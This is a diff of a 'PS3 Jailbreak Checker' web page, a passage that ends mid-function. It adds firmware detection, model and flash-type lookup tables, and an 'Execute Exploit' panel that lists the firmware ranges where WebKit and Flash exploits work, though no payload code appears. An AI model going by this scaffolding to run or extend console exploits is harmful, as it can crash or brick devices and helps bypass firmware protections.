@@ -4,182 +4,202 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>PS3 Jailbreak Checker</title>
-    <!-- External Stylesheet (kept as in original) -->
     <link rel="stylesheet" href="https://raw.githack.com/killstorm103/Rebugger-ToolBox/dev/CSS/Style.css">
-    <!-- External Scripts (kept as in original) -->
-    <script src="https://cdn.jsdelivr.net/gh/killstorm103/Rebugger-ToolBox/dev/Scripts/Platform_Checker.js"></script>
+    <script>
+        /**
+ * PS3 Browser & Firmware Detection
+ * Compatible with PS3 NetFront browser (ES3/ES5 only)
+ */
+(function() {
+    var ua = navigator.userAgent;
+
+    function DetectPS4 () {
+        if (ua.indexOf('PLAYSTATION 4') > -1) return true;
+        if (ua.indexOf('PS4') > -1) return true;
+        return false;
+    }
+    function DetectPS3 () {
+        if (ua.indexOf('PLAYSTATION 3') > -1) return true;
+        if (ua.indexOf('PS3') > -1) return true;
+        if (ua.indexOf('MSIE 6.0') > -1 && ua.indexOf('Windows NT 5.1') > -1) return true;
+        return false;
+    }
+
+    function getPS3FirmwareVersion () {
+        var start = ua.indexOf('PLAYSTATION 3;');
+        if (start === -1) start = ua.indexOf('PS3;');
+        if (start !== -1) {
+            start = ua.indexOf(';', start) + 1;
+            while (ua.charAt(start) === ' ') start++;
+            var end = ua.indexOf(')', start);
+            if (end !== -1) {
+                var version = ua.substring(start, end).replace(/^\s+|\s+$/g, '');
+                if (version.length > 0) return version;
+            }
+        }
+        var prefix = '5.0 (';
+        var suffix = ') Apple';
+        var idxStart = ua.indexOf(prefix);
+        var idxEnd = ua.indexOf(suffix);
+        if (idxStart !== -1 && idxEnd !== -1) {
+            var fwStart = idxStart + 19;
+            var version = ua.substring(fwStart, idxEnd);
+            version = version.replace(/^\s+|\s+$/g, '');
+            if (version.length > 0) return version;
+        }
+        var match = ua.match(/PLAYSTATION 3[; ]+([\d.]+)/i);
+        if (match && match[1]) return match[1];
+        match = ua.match(/PS3[; ]+([\d.]+)/i);
+        if (match && match[1]) return match[1];
+        return '';
+    }
+    function getPS4FirmwareVersion () {
+        var start = ua.indexOf('PLAYSTATION 4;');
+        if (start === -1) start = ua.indexOf('PS4;');
+        if (start !== -1) {
+            start = ua.indexOf(';', start) + 1;
+            while (ua.charAt(start) === ' ') start++;
+            var end = ua.indexOf(')', start);
+            if (end !== -1) {
+                var version = ua.substring(start, end).replace(/^\s+|\s+$/g, '');
+                if (version.length > 0) return version;
+            }
+        }
+        var prefix = '5.0 (';
+        var suffix = ') Apple';
+        var idxStart = ua.indexOf(prefix);
+        var idxEnd = ua.indexOf(suffix);
+        if (idxStart !== -1 && idxEnd !== -1) {
+            var fwStart = idxStart + 19;
+            var version = ua.substring(fwStart, idxEnd);
+            version = version.replace(/^\s+|\s+$/g, '');
+            if (version.length > 0) return version;
+        }
+        var match = ua.match(/PLAYSTATION 4[; ]+([\d.]+)/i);
+        if (match && match[1]) return match[1];
+        match = ua.match(/PS4[; ]+([\d.]+)/i);
+        if (match && match[1]) return match[1];
+        return '';
+    }
+
+    window.isPS3 = DetectPS3();
+    window.isPS4 = DetectPS4();
+    window.ps3Firmware = window.isPS3 ? getPS3FirmwareVersion() : '';
+    window.ps4Firmware = window.isPS4 ? getPS4FirmwareVersion() : '';
+    window.isPS3SilkBrowserEngine = window.isPS3 && navigator.userAgent.indexOf('AppleWebKit') === -1;
+    window.UserAgent = ua;
+})();
+    </script>
     
-    <!-- Internal styles for overlay and small tweaks -->
     <style>
-        /* ---- Zoom overlay (from original) ---- */
-        #image-overlay {
-            display: none;
-            position: fixed;
-            top: 0; left: 0;
-            width: 100%; height: 100%;
-            background: rgba(0,0,0,0.9);
-            z-index: 9999;
-            cursor: pointer;
-            text-align: center;
-            padding: 20px;
-            box-sizing: border-box;
-        }
-        #image-overlay img {
-            max-width: 90%;
-            max-height: 90%;
-            margin-top: 5%;
-            border-radius: 8px;
-            box-shadow: 0 0 30px #000;
-        }
-        /* ---- Minimal header (like original) ---- */
-        .fixed-header {
-            background: #111;
-            padding: 10px 20px;
-            border-bottom: 3px solid #dc3545;
-            color: #fff;
-            font-family: sans-serif;
-        }
-        .fixed-header h1 {
-            margin: 0;
-            font-size: 24px;
-            font-weight: bold;
-        }
-        .container {
-            max-width: 1100px;
-            margin: 20px auto;
-            padding: 0 15px;
-        }
-        /* Spanned lines style */
-        .spanned {
-            display: block;
-            color: #ccc;
-            margin-bottom: 2px;
-        }
-        .spanned strong {
-            color: #f79452;
-        }
-        /* Inputs / buttons */
-        input, select, button {
-            font-family: inherit;
-        }
-        .zoomable {
-            cursor: zoom-in;
-        }
-        /* Small fix for tutorial button */
-        #tutorialBtn {
-            background: #555;
-            color: #fff;
-            border: 1px solid #777;
-            border-radius: 4px;
-            padding: 6px 18px;
-            cursor: pointer;
-            font-weight: bold;
-        }
-        #tutorialBtn:hover {
-            background: #666;
-        }
-        #manualTutorial {
-            background: #333;
-            border-radius: 4px;
-            border-left: 3px solid #dc3545;
-            padding: 12px;
-            margin-top: 12px;
-            color: #ddd;
-            line-height: 1.6;
-        }
-        #manualTutorial span {
-            color: #f79452;
-        }
-        /* Keep the red left border on blocks */
-        .console-block {
-            background: #222;
-            border-left: 5px solid #dc3545;
-            padding: 15px;
-            color: #fff;
-            margin-bottom: 15px;
-        }
-        .console-block strong {
-            display: block;
-            margin-bottom: 8px;
-        }
-        .console-block .sub {
-            color: #f79452;
-        }
-        .result-box {
-            margin-top: 10px;
-            font-weight: bold;
-            line-height: 1.8;
-        }
-        .result-box span {
-            display: inline-block;
-        }
-        /* datecode-box */
-        #datecode-box {
-            display: none;
-            margin-top: 10px;
-            padding: 10px;
-            background: #2a2a2a;
-            border-radius: 4px;
-            border-left: 3px solid #dc3545;
-        }
-        #datecode-box label {
-            color: #f79452;
-        }
-        /* image tables */
-        .image-table {
-            border-collapse: collapse;
-            margin-top: 10px;
-            display: inline-block;
-        }
-        .image-table td {
-            vertical-align: top;
-            padding-right: 20px;
-        }
-        .image-table img {
-            border-radius: 8px;
-            box-shadow: 2px 2px 6px rgba(0,0,0,0.3);
-        }
-        /* small tweaks for mobile */
-        @media (max-width: 700px) {
-            .image-table td {
-                display: block;
-                padding-right: 0;
-                margin-bottom: 10px;
-            }
-            input[type="text"] {
-                width: 100% !important;
-                box-sizing: border-box;
-            }
-            select {
-                width: auto;
-            }
-        }
+        #image-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 9999; cursor: pointer; text-align: center; padding: 20px; box-sizing: border-box; }
+        #image-overlay img { max-width: 90%; max-height: 90%; margin-top: 5%; border-radius: 8px; box-shadow: 0 0 30px #000; }
+        .fixed-header { background: #111; padding: 10px 20px; border-bottom: 3px solid #dc3545; color: #fff; font-family: sans-serif; }
+        .fixed-header h1 { margin: 0; font-size: 24px; font-weight: bold; }
+        .container { max-width: 1100px; margin: 20px auto; padding: 0 15px; }
+        .spanned { display: block; color: #ccc; margin-bottom: 2px; }
+        .spanned strong { color: #f79452; }
+        input, select, button { font-family: inherit; }
+        .zoomable { cursor: zoom-in; }
+        #tutorialBtn { background: #555; color: #fff; border: 1px solid #777; border-radius: 4px; padding: 6px 18px; cursor: pointer; font-weight: bold; }
+        #tutorialBtn:hover { background: #666; }
+        #manualTutorial { background: #333; border-radius: 4px; border-left: 3px solid #dc3545; padding: 12px; margin-top: 12px; color: #ddd; line-height: 1.6; }
+        #manualTutorial span { color: #f79452; }
+        .console-block { background: #222; border-left: 5px solid #dc3545; padding: 15px; color: #fff; margin-bottom: 15px; }
+        .console-block strong { display: block; margin-bottom: 8px; }
+        .console-block .sub { color: #f79452; }
+        .result-box { margin-top: 10px; font-weight: bold; line-height: 1.8; }
+        .result-box span { display: inline-block; }
+        #datecode-box, #readFlashDropdown { display: none; margin-top: 10px; padding: 10px; background: #2a2a2a; border-radius: 4px; border-left: 3px solid #dc3545; }
+        #datecode-box label, #readFlashDropdown label { color: #f79452; }
+        .image-table { border-collapse: collapse; margin-top: 10px; display: inline-block; }
+        .image-table td { vertical-align: top; padding-right: 20px; }
+        .image-table img { border-radius: 8px; box-shadow: 2px 2px 6px rgba(0,0,0,0.3); }
+        @media (max-width: 700px) { .image-table td { display: block; padding-right: 0; margin-bottom: 10px; } input[type="text"] { width: 100% !important; box-sizing: border-box; } select { width: auto; } }
+        #WebKit_exploit, #WebKit_trigger { display: none; }
+        
+        
     </style>
 </head>
 <body>
 
-    <!-- Zoom overlay (kept as original) -->
+    <!-- WebKit exploit elements -->
+    <div id="WebKit_exploit" style="display:none;"></div>
+    <div id="WebKit_trigger" style="display:none;"></div>
+
+    <!-- Zoom overlay -->
     <div id="image-overlay" onclick="closeZoom()">
         <img id="zoom-img" src="" alt="Zoomed image">
     </div>
     <div id="mainContainer" class="container">
-        <!-- Only the Console Information bloc (the checker) -->
-        
 
-        <!-- Checker main block -->
         <div class="console-block">
             <strong style="color: #dc3545;">Dillans PS3</strong>
             <strong>Compatible Jailbreak Types Checker</strong>
-            <span class="sub">Enter your PS3 model number:</span><br>
-            <input type="text" id="modelInput" placeholder="Examples: CECH-2002A, CECH-2501A, DECR-1000A, DECH-A00A, CEB-1000" 
-                   style="margin-top:5px; padding:5px; width:530px; background:#333; color:#fff; border:1px solid #555; border-radius:4px;">
-            <button type="button" id="checkBtn" style="margin-left:5px; padding:5px 15px; background:#dc3545; color:#fff; border:none; border-radius:4px; cursor:pointer; font-weight:bold;" onclick="runChecker(null)">Check</button>
+            <span class="sub">Enter your PS3 model number (optional):</span><br>
             
-            <!-- Date code / manufacturing date box (hidden initially) -->
+            <input type="text" id="modelInput" placeholder="Examples: CECH-2002A, CECH-2501A, DECR-1000A" 
+                   style="margin-top:5px; padding:5px; width:380px; background:#333; color:#fff; border:1px solid #555; border-radius:4px; vertical-align: middle;">
+            
+            <button type="button" id="checkBtn" style="margin-top:5px; margin-left:5px; padding:5px 15px; background:#dc3545; color:#fff; border:none; border-radius:4px; cursor:pointer; font-weight:bold; vertical-align: middle;" onclick="runChecker(null)">Check</button>
+            
+            <button type="button" id="readFlashBtn" style="display:inline-block; margin-top:5px; margin-left:5px; padding:5px 15px; background:#dc3545; color:#fff; border:none; border-radius:4px; cursor:pointer; font-weight:bold; vertical-align: middle;" onclick="toggleReadFlash()">Read Flash</button>
+            
+          <div id="readFlashDropdown" style="margin-top:1">
+
+    <!-- Left Column: Dropdown & Execute Button -->
+    <div style="display: inline-block; vertical-align: top; margin-right: 15px;">
+        <label style="font-weight:bold; display:block; margin-bottom:4px;">Method:</label>
+        <select id="exploitMethod" style="padding:5px 10px; background:#333; color:#fff; border:2px solid #555; border-radius:4px; font-size:1rem; width:auto; margin-bottom: 12px;">
+            <option value="flash9">1: FlashPlayer9 Exploit</option>
+            <option value="webkit">2: WebKit Exploit</option>
+            <option value="test">3: Test</option>
+        </select>
+        
+        <div>
+            <button type="button" id="executeExploitBtn" style="padding:6px 18px; background:#dc3545; color:#fff; border:none; border-radius:4px; cursor:pointer; font-weight:bold; font-size:1.45rem; margin:0;">
+                Execute Exploit
+            </button>
+        </div>
+    </div>
+
+    <!-- Right Column: Info Box -->
+    <div style="display: inline-block; vertical-align: top; color:#aaa; font-size:1.1rem; line-height:1.5; background:#2a2a2a; padding:6px 12px; border-radius:4px; border-left:2px solid #dc3545;">
+        <strong style="color:#f79452;">Info:</strong>
+        
+        <!-- Dynamic Firmware Line (Visible by default) -->
+        <span id="ps3FwInfo" style="color:#ddd;">
+            Your current PS3 Firmware is: <span id="ps3FwVal"></span><br>
+        </span>
+
+        <span style="color:#ddd;">FlashPlayer9:</span>
+        <span style="color:#4CAF50;">OFW 4.80-4.93</span><br>
+        <span style="color:#ddd;">WebKit:</span>
+        <span style="color:#4CAF50;">OFW 4.80-4.82 | HFW 4.83-4.93</span><br><br>
+        <span style="color:#f79452;">Warning Do Not Use These on a Firmware that is not listed!</span><br>
+        <span style="color:#f79452;">it will Crash your PS3!</span>
+    </div>
+
+    <embed id="flash_exploit" type="application/x-shockwave-flash" width="0" height="0">
+</div>
+<script>
+    (function updatePS3Info() {
+        var fwContainer = document.getElementById("ps3FwInfo");
+        var fwVal = document.getElementById("ps3FwVal");
+        if (window.isPS3 && window.ps3Firmware) 
+        {
+            fwVal.innerHTML = window.ps3Firmware;
+        } else {
+            fwContainer.style.display = "none";
+        }
+    })();
+</script>
+
+
+
             <div id="datecode-box">
                 <span class="sub">Enter your PS3's date code or manufacturing date:</span><br>
-                <input type="text" id="datecodeInput" placeholder="Example: 0C" 
-                       style="margin-top:5px; padding:5px; width:150px; background:#333; color:#fff; border:1px solid #555; border-radius:4px; vertical-align: middle;">
+                <input type="text" id="datecodeInput" placeholder="Example: 0C" style="margin-top:5px; padding:5px; width:150px; background:#333; color:#fff; border:1px solid #555; border-radius:4px; vertical-align: middle;">
                 <select id="monthSelect" style="margin-top:5px; margin-left:5px; padding:5px; background:#333; color:#fff; border:1px solid #555; border-radius:4px; vertical-align: middle;">
                     <option value="">Month</option>
                     <option value="1">January (1)</option>
@@ -206,7 +226,6 @@
                 <button type="button" id="datecodeBtn" style="margin-left:5px; padding:5px 15px; background:#dc3545; color:#fff; border:none; border-radius:4px; cursor:pointer; font-weight:bold; vertical-align: middle;" onclick="verifyDateCode()">Verify</button>
             </div>
 
-            <!-- Results area -->
             <div id="cfwResult" class="result-box"></div>
 
             <br>
@@ -242,11 +261,1028 @@
             </a>
         </div>
     </div>
+
     <script src="https://cdn.jsdelivr.net/gh/killstorm103/Rebugger-ToolBox@dev/Scripts/Correction.js"></script>
+
+    <!-- ============================================================ -->
+    <!-- UI Helpers                                                   -->
+    <!-- ============================================================ -->
     <script>
         window.ShowTutorials = true;
         window.ShowJailbreakTypes = true;
+
+        function toggleReadFlash() {
+            var dropdown = document.getElementById("readFlashDropdown");
+            if (dropdown.style.display === "none" || dropdown.style.display === "") {
+                dropdown.style.display = "block";
+            } else {
+                dropdown.style.display = "none";
+            }
+        }
+
+        function showResult(htmlContent) {
+            var resultBox = document.getElementById("cfwResult");
+            if (resultBox) {
+                resultBox.innerHTML = htmlContent;
+            } else {
+                console.log(htmlContent);
+            }
+        }
+
+        document.addEventListener('DOMContentLoaded', function () {
+            var btn = document.getElementById('executeExploitBtn');
+            if (btn) 
+            {
+                btn.addEventListener('click', function ()
+                {
+                    if (!window.isPS3)
+                    {
+                        alert("You must be on your PS3!");
+                        return;
+                    }
+                    var fwv = window.ps3Firmware;
+                    var fwvFloat = parseFloat(fwv.toString());
+                    var isDebug = false;
+                    
+                    
+                    var selectedMethod = document.getElementById('exploitMethod').value;
+                    
+                    var Webkit_min_version = 4.80, Webkit_max_version = 4.93;
+                    var Flash9_min_version = 4.80, Flash9_max_version = 4.93;
+                    
+                    if (selectedMethod === 'webkit') 
+                    {
+                        if (!isDebug && (fwvFloat < Webkit_min_version || fwvFloat > Webkit_max_version))
+                        {
+                            alert("Your on to high or low of a firmware version follow whats said inside: Info");
+                            return;
+                        }
+                        if (typeof window.runWebKitExploit === 'function')
+                        {
+                            setTimeout(window.runWebKitExploit, 100);
+                        } else {
+                            showResult("<h3 style='color:red'>WebKit exploit not loaded.</h3>");
+                        }
+                    }
+                    else if (selectedMethod === 'flash9') 
+                    {
+                        if (!isDebug && (fwvFloat < Flash9_min_version || fwvFloat > Flash9_max_version))
+                        {
+                            alert("Your on to high or low of a firmware version follow whats said inside: Info");
+                            return;
+                        }
+                        showResult("<h3>FlashPlayer9 Exploit selected – not implemented yet.</h3>");
+                    } 
+                    else if (selectedMethod === 'test') 
+                    {
+                        showResult("<h3>Test method selected – no action.</h3>");
+                    }
+                });
+            }
+        });
     </script>
-    <script src="https://cdn.jsdelivr.net/gh/killstorm103/PS3-Compatible-Jailbreak-Types-Checker@main/Scripts/PS3_JB_Checker.js"></script>
+
+    <!-- ============================================================ -->
+    <!-- Model Checker (full from your second file)                  -->
+    <!-- ============================================================ -->
+    <script>
+        function trimStr(str) { return str.replace(/^\s+|\s+$/g, ''); }
+
+        function parseFullDate(dateStr) {
+            var s = trimStr(dateStr);
+            var parts = s.split(/\s+/);
+            if (parts.length < 2) return null;
+            var monthName = parts[0].toLowerCase();
+            var yearPart = parts[1];
+            var year = parseInt(yearPart, 10);
+            if (isNaN(year) || year < 2009 || year > 2013) return null;
+            var months = { 
+                january:1, february:2, march:3, april:4, may:5, june:6,
+                july:7, august:8, september:9, october:10, november:11, december:12,
+                jan:1, feb:2, mar:3, apr:4, jun:6, jul:7, aug:8, sep:9, oct:10, nov:11, dec:12 
+            };
+            var monthNum = months[monthName];
+            if (monthNum === undefined) return null;
+            return { yearDigit: year - 2010, month: monthNum, year: year };
+        }
+
+        function getModelPrefix(cleaned) {
+            if (/^CECH[A-HJ-MP-Q]/.test(cleaned)) return cleaned.substring(0,5);
+            var match = cleaned.match(/^CECH(\d\d)/);
+            if (match) return 'CECH-' + match[1];
+            return cleaned;
+        }
+
+        function getPS3Model(model) {
+            if (!model || model === '?') return '?';
+            var cleaned = '';
+            for (var i = 0; i < model.length; i++) {
+                var ch = model.charAt(i);
+                if ((ch >= '0' && ch <= '9') || (ch >= 'A' && ch <= 'Z') || (ch >= 'a' && ch <= 'z')) cleaned += ch;
+            }
+            var m = cleaned.toUpperCase();
+            if (/^DECR/.test(m)) return 'Reference Tool';
+            if (/^DECHS/.test(m)) return 'Debug Station';
+            if (/^DECH/.test(m)) return 'Debug Station';
+            if (/^CEB/.test(m)) return 'Prototype';
+            if (m.indexOf('CECHA') === 0 || m.indexOf('CECHB') === 0 || m.indexOf('CECHC') === 0 ||
+                m.indexOf('CECHE') === 0 || m.indexOf('CECHG') === 0 || m.indexOf('CECHH') === 0 ||
+                m.indexOf('CECHJ') === 0 || m.indexOf('CECHK') === 0 || m.indexOf('CECHL') === 0 ||
+                m.indexOf('CECHM') === 0 || m.indexOf('CECHP') === 0 || m.indexOf('CECHQ') === 0) return 'Fat';
+            if (m.indexOf('CECH4') === 0) return 'Super Slim';
+            if (m.indexOf('CECH2') === 0 || m.indexOf('CECH3') === 0) return 'Slim';
+            return 'Unknown';
+        }
+
+        function getFlashType(model) {
+            if (!model || model === '?') return 'Unknown';
+            var m = model.toUpperCase();
+            if (m.indexOf('CECHA') === 0 || m.indexOf('CECHB') === 0 ||
+                m.indexOf('CECHC') === 0 || m.indexOf('CECHE') === 0 ||
+                m.indexOf('CECHG') === 0) return 'NAND';
+            if (/^DECR-?1000/.test(m)) return 'NAND';
+            if (/^DECH-?A00/.test(m) || /^DECH-?J00/.test(m) || /^DECHSJ00/.test(m)) return 'NAND';
+            if ((/^CECH-?42\d{2}[A-Za-z]?$/).test(m) || (/^CECH-?43\d{2}[A-Za-z]?$/).test(m)) return 'eMMC';
+            if (/^DECH-?4000/.test(m) || /^DECH-?40\d{2}[A-Za-z]?$/.test(m)) return 'eMMC';
+            return 'NOR';
+        }
+
+        function getBackwardsCompatibility(type, model, boolean) {
+            var m = model.toUpperCase();
+            if (m.indexOf('CECHA') === 0 || m.indexOf('CECHB') === 0) return "Full PS2 Hardware (EE+GS)";
+            if (m.indexOf('CECHC') === 0 || m.indexOf('CECHE') === 0) return "Partial PS2 (GS only)";
+            if (m.indexOf('DECR') === 0) return "No (No PS2 hardware or emulator)";
+            if (m.indexOf('CEB') === 0) return "No (Development Prototype, no PS2 hardware or PS2 emulation)";
+            if (m.indexOf('DECH') === 0) {
+                if (m.indexOf('DECH25') === 0 || m.indexOf('DECH-25') === 0 || m.indexOf('DECHS25') === 0)
+                    return boolean === true ? (type == "OFW" ? "No" : "Yes Through Emulation") : "OFW: No, If Jailbroken Yes Through Emulation";
+                if (m.indexOf('DECH30') === 0 || m.indexOf('DECH-30') === 0 || m.indexOf('DECH40') === 0 || m.indexOf('DECH-40') === 0)
+                    return boolean === true ? (type == "OFW" ? "No" : "Yes Through Emulation") : "OFW: No, If Jailbroken Yes Through Emulation";
+                return "Full PS2 Hardware (EE+GS)";
+            }
+            return boolean === true ? (type == "OFW" ? "No" : "Yes Through Emulation") : "OFW: No, If Jailbroken Yes Through Emulation";
+        }
+
+        function getMaxDowngradeFirmware(model, date_code, manufacturing_date, month, year) {
+            if (!model) return null;
+            var isOldStyle = (typeof date_code === 'number' || date_code === undefined) && (typeof manufacturing_date === 'number' || manufacturing_date === undefined);
+            var yr = 0, mo = 0, hasDate = false;
+            if (isOldStyle) {
+                var m = (typeof date_code === 'number') ? date_code : 0;
+                var y = (typeof manufacturing_date === 'number') ? manufacturing_date : 0;
+                if (m>0 && y>0) { mo=m; yr=y; hasDate=true; }
+            } else {
+                if (manufacturing_date && manufacturing_date.trim && manufacturing_date.trim()!=='') {
+                    var man = manufacturing_date.trim(), parts = man.split(/\s+/);
+                    if (parts.length>=2) {
+                        var monthNames = ["january","february","march","april","may","june","july","august","september","october","november","december"];
+                        var monthLower = parts[0].toLowerCase();
+                        for (var i=0; i<monthNames.length; i++) {
+                            if (monthNames[i].indexOf(monthLower)===0 || monthLower===monthNames[i]) { mo=i+1; break; }
+                        }
+                        var yrNum = parseInt(parts[1],10);
+                        if (!isNaN(yrNum) && yrNum>=2009 && yrNum<=2013) { yr=yrNum; hasDate=true; }
+                    }
+                }
+                if (!hasDate && date_code && date_code.trim && date_code.trim()!=='') {
+                    var dc = date_code.trim().toUpperCase();
+                    if (dc.length>=2) {
+                        var yd = dc.charCodeAt(0)-48, qc = dc.charAt(1), quarter = qc.charCodeAt(0)-64;
+                        if (!isNaN(yd) && quarter>=1 && quarter<=4) { yr=yd+2010; mo=(quarter-1)*3+1; hasDate=true; }
+                    }
+                }
+                if (!hasDate && typeof month === 'number' && typeof year === 'number') {
+                    if (month>=1 && month<=12 && year>=2009 && year<=2013) { mo=month; yr=year; hasDate=true; }
+                }
+            }
+            var cleaned = model.toUpperCase().replace(/[-\s]/g,''), prefix='';
+            if (cleaned.indexOf('DECR')===0) prefix='DECR';
+            else if (cleaned.indexOf('DECH')===0) {
+                var numMatch = cleaned.match(/^DECH(\d{2})/);
+                if (numMatch) prefix = 'DECH-' + numMatch[1];
+                else prefix = 'DECH';
+            } else if (cleaned.indexOf('CEB')===0) prefix='CEB';
+            else {
+                var fatLetterMatch = cleaned.match(/^CECH([A-Z])/);
+                if (fatLetterMatch) prefix = 'CECH' + fatLetterMatch[1];
+                else { var nMatch = cleaned.match(/^CECH(\d{2})/); if (nMatch) prefix = 'CECH-' + nMatch[1]; }
+            }
+            if (!prefix) return null;
+            if (prefix === 'DECR') {
+                if (cleaned.indexOf('DECR-1000')!==-1) return "0.85";
+                if (cleaned.indexOf('DECR-1400')!==-1) return "2.60";
+                if (cleaned.indexOf('DECR-1500')!==-1) return "3.56+ (Likely >3.56, verify with MinVerChk)";
+                if (cleaned.indexOf('DECR-1600')!==-1) return "4.11+ (Likely >4.10, verify with MinVerChk)";
+                return "Unknown (Dev Kit)";
+            }
+            if (prefix === 'CEB') return "Unknown (Early Prototype)";
+            if (prefix === 'DECH') return "1.00";
+            if (prefix === 'DECH-20') return "2.70";
+            if (prefix === 'DECH-21') return "3.20";
+            if (prefix === 'DECH-25') {
+                if (!hasDate) return "3.40–3.60+ (requires date code or manufacturing date)";
+                if (yr < 2010 || (yr===2010 && mo<7)) return "N/A (model not yet manufactured)";
+                if (yr===2010) { if (mo>=7 && mo<=9) return "3.40"; if (mo>=10 && mo<=12) return "3.40 or 3.50"; }
+                if (yr===2011) {
+                    if (mo>=1 && mo<=3) return "3.60+ (some 3.50-3.56)";
+                    if (mo>=4 && mo<=6) return "3.60+ or 3.56 (Rare!)";
+                    if (mo>=7) return "N/A (production ended)";
+                }
+                if (yr>=2012) return "N/A (production ended)";
+                return "3.40–3.60+ (requires date code)";
+            }
+            if (prefix === 'DECH-30') return "3.60+";
+            if (prefix === 'DECH-40') return "4.11–4.31";
+            if (prefix === 'CECHA' || prefix === 'CECHB') return "1.00";
+            if (prefix === 'CECHC') return "1.00";
+            if (prefix === 'CECHE') return "1.00";
+            if (prefix === 'CECHG') return "1.90";
+            if (prefix === 'CECHH') return "1.97";
+            if (prefix === 'CECHJ') return "2.16";
+            if (prefix === 'CECHK' || prefix === 'CECHL' || prefix === 'CECHM' || prefix === 'CECHP' || prefix === 'CECHQ') return "2.45";
+            if (prefix === 'CECH-20') return "2.70";
+            if (prefix === 'CECH-21') return "3.20";
+            if (prefix === 'CECH-25') {
+                if (!hasDate) return "3.40–3.60+ (requires date code or manufacturing date)";
+                if (yr < 2010 || (yr===2010 && mo<7)) return "N/A (model not yet manufactured)";
+                if (yr===2010) { if (mo>=7 && mo<=9) return "3.40"; if (mo>=10 && mo<=12) return "3.40 or 3.50"; }
+                if (yr===2011) {
+                    if (mo>=1 && mo<=3) return "3.60+ (some 3.50-3.56)";
+                    if (mo>=4 && mo<=6) return "3.60+ or 3.56 (Rare!)";
+                    if (mo>=7) return "N/A (production ended)";
+                }
+                if (yr>=2012) return "N/A (production ended)";
+                return "3.40–3.60+ (requires date code)";
+            }
+            if (prefix === 'CECH-30') return "3.60+";
+            if (prefix === 'CECH-40') return "4.11–4.31";
+            if (prefix === 'CECH-42') return "4.40";
+            if (prefix === 'CECH-43') return "4.50";
+            return null;
+        }
+
+        function checkCFWCompatibility(model, datecode) {
+            var cleaned = model.toUpperCase().replace(/\s/g, '').replace(/-/g, '');
+            if (cleaned.indexOf('CECH') !== 0 && cleaned.indexOf('DECH') !== 0 && cleaned.indexOf('DECR') !== 0 && cleaned.indexOf('CEB') !== 0)
+                cleaned = 'CECH' + cleaned;
+            var isDevKit = (cleaned.indexOf('DECR') === 0 || cleaned.indexOf('DECH') === 0 || cleaned.indexOf('DECHS') === 0 || cleaned.indexOf('CEB') === 0);
+            var cfw = '', maxDowngradeFirmware = null, prefix = getModelPrefix(cleaned);
+            if (prefix) {
+                var yr = 0, mo = 0;
+                if (datecode) {
+                    var pd = parseFullDate(datecode);
+                    if (pd) { yr = pd.year; mo = pd.month; }
+                    else {
+                        var dc = trimStr(datecode.toUpperCase());
+                        if (dc.length >= 2) {
+                            var yd = dc.charCodeAt(0)-48, qc = dc.charAt(1), quarter = qc.charCodeAt(0)-64;
+                            if (!isNaN(yd) && quarter>=1 && quarter<=4) { yr = yd+2010; mo = (quarter-1)*3+1; }
+                        }
+                    }
+                }
+                maxDowngradeFirmware = getMaxDowngradeFirmware(prefix, mo, yr);
+            }
+            function getDateInfo(dc) {
+                if (!dc) return null;
+                var parsed = parseFullDate(dc);
+                if (parsed) return { year: parsed.year, month: parsed.month, isManufactureDate: true };
+                var dcu = trimStr(dc.toUpperCase());
+                if (dcu.length>=2) {
+                    var yd = dcu.charCodeAt(0)-48, qc = dcu.charAt(1), quarter = qc.charCodeAt(0)-64;
+                    if (!isNaN(yd) && quarter>=1 && quarter<=4) return { year: yd+2010, month: (quarter-1)*3+1, isManufactureDate: false };
+                }
+                return null;
+            }
+            if (isDevKit) {
+                if (cleaned.indexOf('DECR')===0) cfw = 'Yes';
+                else if (cleaned.indexOf('CEB')===0) cfw = 'Yes';
+                else {
+                    if (cleaned.indexOf('DECH25')===0 || cleaned.indexOf('DECH-25')===0 || cleaned.indexOf('DECHS25')===0) {
+                        if (!datecode) return 'NEED_DATE';
+                        var dinfo = getDateInfo(datecode);
+                        if (!dinfo) return 'Invalid date code';
+                        var year = dinfo.year, month = dinfo.month, label = dinfo.isManufactureDate ? 'manufacturing date' : 'date code';
+                        if (year<=2010) cfw = 'Yes (DECH-25xx, ' + label + ' ' + datecode + ' - min firmware < 3.60)';
+                        else if (year===2011) {
+                            if (month>=1 && month<=3) cfw = 'Maybe - Manual check required (minimum firmware version must be < 3.60)';
+                            else if (month>=4 && month<=6) cfw = 'Maybe (Very Unlikely & Rare) - Manual check required (minimum firmware version must be < 3.60)';
+                            else cfw = 'No (DECH-25xx, ' + label + ' ' + datecode + ' - production ended)';
+                        } else cfw = 'No (DECH-25xx, ' + label + ' ' + datecode + ' - min firmware > 3.56)';
+                    }
+                    else if (cleaned.indexOf('DECH30')===0 || cleaned.indexOf('DECH-30')===0 || cleaned.indexOf('DECH40')===0 || cleaned.indexOf('DECH-40')===0) cfw = 'No';
+                    else cfw = 'Yes';
+                }
+            } else {
+                if (cleaned.indexOf('CECHA')===0 || cleaned.indexOf('CECHB')===0 || cleaned.indexOf('CECHC')===0 || cleaned.indexOf('CECHE')===0 ||
+                    cleaned.indexOf('CECHG')===0 || cleaned.indexOf('CECHH')===0 || cleaned.indexOf('CECHJ')===0 || cleaned.indexOf('CECHK')===0 ||
+                    cleaned.indexOf('CECHL')===0 || cleaned.indexOf('CECHM')===0 || cleaned.indexOf('CECHP')===0 || cleaned.indexOf('CECHQ')===0) cfw = 'Yes';
+                else if (cleaned.indexOf('CECH20')===0 || cleaned.indexOf('CECH-20')===0 || cleaned.indexOf('CECH21')===0 || cleaned.indexOf('CECH-21')===0) cfw = 'Yes';
+                else if (cleaned.indexOf('CECH25')===0 || cleaned.indexOf('CECH-25')===0) {
+                    if (!datecode) return 'NEED_DATE';
+                    var dinfo = getDateInfo(datecode);
+                    if (!dinfo) return 'Invalid date code';
+                    var year = dinfo.year, month = dinfo.month, label = dinfo.isManufactureDate ? 'manufacturing date' : 'date code';
+                    if (year<=2010) cfw = 'Yes (CECH-25xx, ' + label + ' ' + datecode + ' - min firmware < 3.60)';
+                    else if (year===2011) {
+                        if (month>=1 && month<=3) cfw = 'Maybe - Manual check required (minimum firmware version must be < 3.60)';
+                        else if (month>=4 && month<=6) cfw = 'Maybe (Very Unlikely & Rare) - Manual check required (minimum firmware version must be < 3.60)';
+                        else cfw = 'No (CECH-25xx, ' + label + ' ' + datecode + ' - production ended)';
